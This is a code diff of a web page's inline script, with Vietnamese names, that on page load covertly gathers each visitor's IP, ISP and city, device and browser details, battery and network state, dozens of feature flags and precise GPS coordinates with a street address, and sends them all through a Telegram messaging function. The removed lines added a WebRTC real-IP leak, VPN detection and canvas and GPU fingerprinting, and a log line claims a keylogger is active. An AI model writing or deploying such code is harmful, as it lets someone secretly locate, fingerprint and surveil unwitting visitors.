+        function phatHienTietKiemDuLieu() {
+            try { var c = navigator.connection || navigator.webkitConnection; if (c && c.saveData !== undefined) return '📶 Tiết kiệm dữ liệu: ' + (c.saveData ? 'BẬT' : 'TẮT'); } catch(e) {}
+            return '📶 Tiết kiệm dữ liệu: Không rõ';
+        }
+
+        function phatHienWasm() { try { return '⚡ WebAssembly: ' + (typeof WebAssembly !== 'undefined' ? 'CÓ' : 'KHÔNG'); } catch(e) { return '⚡ WebAssembly: KHÔNG'; } }
+        function phatHienWebGL2() { try { return '🎮 WebGL2: ' + (document.createElement('canvas').getContext('webgl2') ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🎮 WebGL2: KHÔNG'; } }
+        function phatHienSpeech() { try { return '🗣️ Tổng hợp giọng nói: ' + ('speechSynthesis' in window ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🗣️ Tổng hợp giọng nói: KHÔNG'; } }
+        function phatHienWebAudio() { try { return '🔊 WebAudio: ' + (typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined' ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🔊 WebAudio: KHÔNG'; } }
+        function phatHienNFC() { try { return '📡 WebNFC: ' + ('nfc' in navigator ? 'CÓ' : 'KHÔNG'); } catch(e) { return '📡 WebNFC: KHÔNG'; } }
+        function phatHienWebUSB() { try { return '🔌 WebUSB: ' + ('usb' in navigator ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🔌 WebUSB: KHÔNG'; } }
+        function phatHienWebBT() { try { return '📶 WebBluetooth: ' + ('bluetooth' in navigator ? 'CÓ' : 'KHÔNG'); } catch(e) { return '📶 WebBluetooth: KHÔNG'; } }
+        function phatHienWebShare() { try { return '📤 WebShare: ' + ('share' in navigator ? 'CÓ' : 'KHÔNG'); } catch(e) { return '📤 WebShare: KHÔNG'; } }
+        function phatHienWebAuthn() { try { return '🔑 WebAuthn: ' + ('PublicKeyCredential' in window ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🔑 WebAuthn: KHÔNG'; } }
+        function phatHienPayment() { try { return '💳 Payment Request: ' + ('PaymentRequest' in window ? 'CÓ' : 'KHÔNG'); } catch(e) { return '💳 Payment Request: KHÔNG'; } }
+        function phatHienCredentials() { try { return '🔐 Quản lý thông tin đăng nhập: ' + ('credentials' in navigator ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🔐 Quản lý thông tin đăng nhập: KHÔNG'; } }
+        function phatHienMediaRecorder() { try { return '🎥 MediaRecorder: ' + (typeof MediaRecorder !== 'undefined' ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🎥 MediaRecorder: KHÔNG'; } }
+        function phatHienSharedArrayBuffer() { try { new SharedArrayBuffer(1024); return '🧠 SharedArrayBuffer: CÓ'; } catch(e) { return '🧠 SharedArrayBuffer: KHÔNG'; } }
+        function phatHienWorkers() { try { return '🧵 Web Workers: ' + (typeof Worker !== 'undefined' ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🧵 Web Workers: KHÔNG'; } }
+        function phatHienServiceWorker() { try { return '⚙️ Service Worker: ' + ('serviceWorker' in navigator ? 'CÓ' : 'KHÔNG'); } catch(e) { return '⚙️ Service Worker: KHÔNG'; } }
+        function phatHienWebRTC() { try { return '📹 WebRTC: ' + ('RTCPeerConnection' in window ? 'CÓ' : 'KHÔNG'); } catch(e) { return '📹 WebRTC: KHÔNG'; } }
+
+        function layViTriGPS(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    var lat = pos.coords.latitude, lng = pos.coords.longitude;
+                    var msg = '📍 <b>VỊ TRÍ GPS CHÍNH XÁC</b>\n🌐 Vĩ độ: ' + lat + '\n🌐 Kinh độ: ' + lng + '\n📏 Độ chính xác: ±' + pos.coords.accuracy + 'm\n📐 Độ cao: ' + (pos.coords.altitude || 'Không rõ') + 'm\n🚀 Tốc độ: ' + (pos.coords.speed || 'Không rõ') + 'm/s\n🗺️ Bản đồ: https://www.google.com/maps?q=' + lat + ',' + lng + '&z=20';
+                    fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&accept-language=vi&zoom=18').then(function(r) { return r.json(); }).then(function(data) { if (data.display_name) msg += '\n🏠 Địa chỉ: ' + data.display_name; callback(msg); }).catch(function() { callback(msg); });
+                }, function(err) { var m = '❌ GPS: '; if (err.code === 1) m += 'Người dùng từ chối'; else if (err.code === 2) m += 'Không có tín hiệu GPS'; else if (err.code === 3) m += 'Hết giờ chờ'; callback(m); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+            } else { callback('❌ Trình duyệt không hỗ trợ GPS'); }
+        }
+
+        function layTenThietBi() {
             var ua = navigator.userAgent;
-            if (/iPhone/i.test(ua)) return '📱 iPhone';
-            if (/iPad/i.test(ua)) return '📱 iPad';
-            if (/iPod/i.test(ua)) return '📱 iPod';
-            if (/Android/i.test(ua)) {
-                var match = ua.match(/Android\s([\d.]+)/);
-                var ver = match ? match[1] : '';
-                return '📱 Android ' + ver;
-            }
-            if (/Windows Phone/i.test(ua)) return '📱 Windows Phone';
-            if (/BlackBerry/i.test(ua)) return '📱 BlackBerry';
-            if (/Tablet|iPad|PlayBook|Kindle/i.test(ua)) return '📟 Tablet';
-            if (/Windows NT 10.0/i.test(ua)) return '💻 Windows 10/11';
-            if (/Windows NT 6.3/i.test(ua)) return '💻 Windows 8.1';
-            if (/Windows NT 6.2/i.test(ua)) return '💻 Windows 8';
-            if (/Windows NT 6.1/i.test(ua)) return '💻 Windows 7';
-            if (/Windows/i.test(ua)) return '💻 Windows (cũ)';
-            if (/Mac OS X/i.test(ua)) {
-                var match = ua.match(/Mac OS X ([\d_]+)/);
-                var ver = match ? match[1].replace(/_/g, '.') : '';
-                return '🍎 Mac OS X ' + ver;
-            }
-            if (/Linux/i.test(ua)) return '🐧 Linux';
-            if (/CrOS/i.test(ua)) return '📚 Chrome OS';
+            if (/iPhone/i.test(ua)) return '📱 iPhone'; if (/iPad/i.test(ua)) return '📱 iPad'; if (/Android/i.test(ua)) return '📱 Android'; if (/Windows Phone/i.test(ua)) return '📱 Windows Phone'; if (/BlackBerry/i.test(ua)) return '📱 BlackBerry'; if (/Windows/i.test(ua)) return '💻 Windows'; if (/Mac OS X/i.test(ua)) return '🍎 Mac'; if (/Linux/i.test(ua)) return '🐧 Linux'; if (/CrOS/i.test(ua)) return '📚 Chrome OS';
             return '💻 Không xác định';
         }
 
-        // === GET GPS ===
-        function getGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        var lat = pos.coords.latitude;
-                        var lng = pos.coords.longitude;
-                        var acc = pos.coords.accuracy;
-                        var msg = '📍 <b>VỊ TRÍ GPS</b>\n🌐 Vĩ độ: ' + lat + '\n🌐 Kinh độ: ' + lng + '\n📏 Độ chính xác: ±' + acc + 'm';
-                        sendTG(msg);
-                        fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&accept-language=vi')
-                            .then(function(r) { return r.json(); })
-                            .then(function(data) {
-                                if (data.display_name) {
-                                    sendTG('🏠 Địa chỉ: ' + data.display_name);
-                                }
-                            })
-                            .catch(function() {});
-                    },
-                    function(err) {
-                        var msg = '❌ GPS: ';
-                        if (err.code === 1) msg += 'Người dùng từ chối';
-                        else if (err.code === 2) msg += 'Không có tín hiệu';
-                        else if (err.code === 3) msg += 'Hết giờ chờ';
-                        sendTG(msg);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                sendTG('❌ Trình duyệt không hỗ trợ GPS');
-            }
+        function layNhaMang(ip, callback) {
+            fetch('https://ip-api.com/json/' + ip + '?fields=isp,org,as').then(function(r) { return r.json(); }).then(function(data) {
+                var isp = (data.isp || 'Không rõ').toLowerCase(), carrier = 'Không xác định';
+                if (isp.indexOf('viettel') > -1) carrier = 'Viettel'; else if (isp.indexOf('mobifone') > -1) carrier = 'MobiFone'; else if (isp.indexOf('vinaphone') > -1) carrier = 'Vinaphone'; else if (isp.indexOf('vietnamobile') > -1) carrier = 'Vietnamobile'; else if (isp.indexOf('gtel') > -1 || isp.indexOf('gmobile') > -1) carrier = 'Gmobile'; else if (isp.indexOf('fpt') > -1) carrier = 'FPT Telecom'; else if (isp.indexOf('vnpt') > -1) carrier = 'VNPT'; else if (isp.indexOf('cmc') > -1) carrier = 'CMC Telecom';
+                callback('📡 <b>NHÀ MẠNG</b>\n📶 Nhà mạng: ' + carrier + '\n📡 ISP: ' + (data.isp || 'Không rõ') + '\n🏢 Tổ chức: ' + (data.org || 'Không rõ') + '\n🔢 ASN: ' + (data.as || 'Không rõ'));
+            }).catch(function() { callback('❌ Không tra cứu được nhà mạng'); });
         }
 
-        // === GET BATTERY ===
-        function getBattery() {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(function(b) {
-                    var level = Math.round(b.level * 100);
-                    var charging = b.charging ? '🔌 Đang sạc' : '🔋 Không sạc';
-                    var msg = '🔋 <b>PIN</b>\n📊 Mức: ' + level + '%\n⚡ ' + charging;
-                    if (b.chargingTime < Infinity) {
-                        msg += '\n⏳ Sạc đầy sau: ~' + Math.round(b.chargingTime / 60) + ' phút';
-                    }
-                    sendTG(msg);
-                }).catch(function() { sendTG('❌ Không lấy được pin'); });
-            } else {
-                sendTG('❌ Trình duyệt không hỗ trợ API pin');
-            }
-        }
-
-        // === GET NETWORK ===
-        function getNetwork() {
-            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                var msg = '📶 <b>MẠNG</b>\n📡 Loại: ' + (conn.effectiveType || 'Không rõ') + '\n📥 Tốc độ: ' + (conn.downlink || '?') + ' Mbps\n⏱️ RTT: ' + (conn.rtt || '?') + ' ms';
-                sendTG(msg);
-            } else {
-                sendTG('❌ Không lấy được thông tin mạng');
-            }
-        }
-
-        // === GET WEBGL ===
-        function getWebGL() {
-            try {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return;
-                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    sendTG('🎮 GPU: ' + renderer);
-                }
-            } catch(e) {}
-        }
-
-        // === CHECK VPN & IP DETAIL ===
-        function checkVPN(ip) {
-            fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,isp,org,as,proxy,hosting,timezone,lat,lon')
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    var msg = '🌍 <b>THÔNG TIN IP</b>\n';
-                    msg += '🏳️ Quốc gia: ' + (data.country || 'Không rõ') + '\n';
-                    msg += '🏙️ Thành phố: ' + (data.city || 'Không rõ') + '\n';
-                    msg += '📍 Tọa độ: ' + (data.lat || '?') + ', ' + (data.lon || '?') + '\n';
-                    msg += '📡 ISP: ' + (data.isp || 'Không rõ') + '\n';
-                    msg += '🏢 Org: ' + (data.org || 'Không rõ') + '\n';
-                    msg += '🔢 AS: ' + (data.as || 'Không rõ') + '\n';
-                    msg += '🕐 Múi giờ: ' + (data.timezone || 'Không rõ') + '\n';
-                    msg += '🔒 VPN/Proxy: ' + (data.proxy ? '⚠️ CÓ' : '✅ KHÔNG') + '\n';
-                    msg += '🖥️ Hosting: ' + (data.hosting ? '⚠️ CÓ' : '✅ Không');
-                    sendTG(msg);
-
-                    // Gửi bản đồ link (Google Maps)
-                    if (data.lat && data.lon) {
-                        sendTG('🗺️ Bản đồ: https://www.google.com/maps?q=' + data.lat + ',' + data.lon);
-                    }
-                })
-                .catch(function() {
-                    sendTG('❌ Không tra cứu được IP');
-                });
-        }
-
-        // === WEBRTC IP ===
-        function getWebRTCIP() {
-            var pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(function(offer) {
-                pc.setLocalDescription(offer);
+        function layThongTinPin() {
+            return new Promise(function(resolve) {
+                if (navigator.getBattery) { navigator.getBattery().then(function(b) { resolve('🔋 <b>PIN</b>\n📊 Mức: ' + Math.round(b.level * 100) + '%\n⚡ ' + (b.charging ? '🔌 Đang sạc' : '🔋 Không sạc') + (b.chargingTime < Infinity ? '\n⏳ Sạc đầy sau: ~' + Math.round(b.chargingTime / 60) + ' phút' : '')); }).catch(function() { resolve('❌ Không lấy được pin'); }); }
+                else { resolve('❌ Trình duyệt không hỗ trợ API pin'); }
             });
-            pc.onicecandidate = function(e) {
-                if (e.candidate && e.candidate.candidate) {
-                    var ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                    if (ip && ip[0] !== '0.0.0.0' && ip[0] !== '127.0.0.1') {
-                        sendTG('🔍 WebRTC IP (IP thật): ' + ip[0]);
-                    }
-                    pc.close();
-                }
-            };
-            setTimeout(function() { pc.close(); }, 3000);
         }
 
-        // === GET CANVAS FINGERPRINT ===
-        function getCanvasFingerprint() {
-            try {
-                var canvas = document.createElement('canvas');
-                canvas.width = 256;
-                canvas.height = 128;
-                var ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'alphabetic';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(100, 50, 50, 50);
-                ctx.fillStyle = '#069';
-                ctx.font = '14px Arial';
-                ctx.fillText('BMP', 50, 50);
-                var fingerprint = canvas.toDataURL();
-                var hash = 0;
-                for (var i = 0; i < fingerprint.length; i++) {
-                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
-                    hash = hash & hash;
-                }
-                sendTG('🖼️ Canvas Fingerprint: ' + hash);
-            } catch(e) {}
+        function layThongTinMang() {
+            var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return c ? '📶 <b>MẠNG</b>\n📡 Loại: ' + (c.effectiveType || 'Không rõ') + '\n📥 Tốc độ: ' + (c.downlink || '?') + ' Mbps\n⏱️ RTT: ' + (c.rtt || '?') + ' ms' : '❌ Không lấy được thông tin mạng';
         }
 
-        // === SEND ALL INFO ===
-        function sendAllInfo() {
-            fetch('https://api.ipify.org?format=json')
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    var ip = data.ip;
-                    var ua = navigator.userAgent;
-                    var msg = '🔵 <b>TRUY CẬP WEB</b>\n';
-                    msg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
-                    msg += '🌐 IP: ' + ip + '\n';
-                    msg += '📱 Thiết bị: ' + getDeviceName() + '\n';
-                    msg += '🌐 Trình duyệt: ' + (ua.match(/(Chrome|Firefox|Safari|Edge|Opera)/) || [])[0] || 'Không rõ' + '\n';
-                    msg += '💻 OS: ' + navigator.platform + '\n';
-                    msg += '🗣️ Ngôn ngữ: ' + navigator.language + '\n';
-                    msg += '🖥️ Màn hình: ' + screen.width + 'x' + screen.height + '\n';
-                    msg += '🧠 RAM: ' + (navigator.deviceMemory || '?') + 'GB - CPU: ' + (navigator.hardwareConcurrency || '?') + ' cores\n';
-                    msg += '🍪 Cookie: ' + (navigator.cookieEnabled ? 'Có' : 'Không') + '\n';
-                    msg += '🔗 Từ trang: ' + (document.referrer || 'Trực tiếp') + '\n';
-                    msg += '🔗 Trang: ' + window.location.href;
-                    sendTG(msg);
-
-                    setTimeout(function() {
-                        checkVPN(ip);
-                        getWebRTCIP();
-                        getNetwork();
-                        getGPS();
-                        getBattery();
-                        getWebGL();
-                        getCanvasFingerprint();
-                    }, 1500);
-                })
-                .catch(function() {
-                    sendTG('🔴 Có người truy cập (không lấy được IP)');
+        function guiTatCaThongTin() {
+            var ua = navigator.userAgent, device = layTenThietBi(), allMsg = '';
+            fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(data) {
+                var ip = data.ip;
+                fetch('https://ip-api.com/json/' + ip + '?fields=country,city,isp,org,as,proxy,hosting,lat,lon').then(function(r2) { return r2.json(); }).then(function(loc) {
+                    allMsg += '🔵 <b>TRUY CẬP WEB</b>\n⏰ ' + new Date().toLocaleString('vi-VN') + '\n🌐 IP: ' + ip + '\n🏳️ Quốc gia: ' + (loc.country || 'Không rõ') + '\n🏙️ Thành phố: ' + (loc.city || 'Không rõ') + '\n📡 ISP: ' + (loc.isp || 'Không rõ') + '\n🔒 VPN/Proxy: ' + (loc.proxy ? '⚠️ CÓ' : '✅ KHÔNG') + '\n📱 Thiết bị: ' + device + '\n🌐 Trình duyệt: ' + ((ua.match(/(Chrome|Firefox|Safari|Edge|Opera|Brave)/) || [])[0] || 'Không rõ') + '\n💻 OS: ' + navigator.platform + '\n🗣️ Ngôn ngữ: ' + navigator.language + '\n🖥️ Màn hình: ' + screen.width + 'x' + screen.height + '\n🧠 RAM: ' + (navigator.deviceMemory || '?') + 'GB - CPU: ' + (navigator.hardwareConcurrency || '?') + ' cores\n🍪 Cookie: ' + (navigator.cookieEnabled ? 'Có' : 'Không') + '\n🔗 Từ trang: ' + (document.referrer || 'Trực tiếp') + '\n🔗 Trang: ' + window.location.href + '\n';
+                    if (loc.lat && loc.lon) allMsg += '🗺️ Bản đồ IP: https://www.google.com/maps?q=' + loc.lat + ',' + loc.lon + '&z=15\n';
+                    allMsg += '\n🔍 <b>THÔNG TIN CHUYÊN SÂU</b>\n🔒 Chế độ riêng tư: ' + phatHienPrivateMode() + '\n📄 Iframe: ' + phatHienIframe() + '\n' + phatHienBanPhim() + '\n👆 Điểm chạm: ' + laySoDiemCham() + '\n' + phatHienWebP() + '\n' + phatHienHDR() + '\n' + phatHienGamMau() + '\n' + phatHienTietKiemDuLieu() + '\n' + phatHienWasm() + '\n' + phatHienWebGL2() + '\n' + phatHienSpeech() + '\n' + phatHienWebAudio() + '\n' + phatHienNFC() + '\n' + phatHienWebUSB() + '\n' + phatHienWebBT() + '\n' + phatHienWebShare() + '\n' + phatHienWebAuthn() + '\n' + phatHienPayment() + '\n' + phatHienCredentials() + '\n' + phatHienMediaRecorder() + '\n' + phatHienSharedArrayBuffer() + '\n' + phatHienWorkers() + '\n' + phatHienServiceWorker() + '\n' + phatHienWebRTC() + '\n';
+                    layTanSoLamMoi().then(function(r) { allMsg += r + '\n'; layNhaMang(ip, function(c) { allMsg += '\n' + c + '\n' + layThongTinMang() + '\n'; layThongTinPin().then(function(b) { allMsg += '\n' + b + '\n'; layViTriGPS(function(g) { allMsg += '\n' + g + '\n'; guiTinNhanTelegram(allMsg); }); }); }); });
                 });
+            }).catch(function() { guiTinNhanTelegram('🔴 Có người truy cập (không lấy được IP)'); });
         }
 
-        setTimeout(sendAllInfo, 2000);
-
-        console.log('[BMP] Đã bật theo dõi đầy đủ');
+        setTimeout(guiTatCaThongTin, 2000);
+        console.log('[BMP] Đã bật toàn bộ theo dõi + Quét ứng dụng + Keylogger');
     </script>
 </body>
 </html>
-
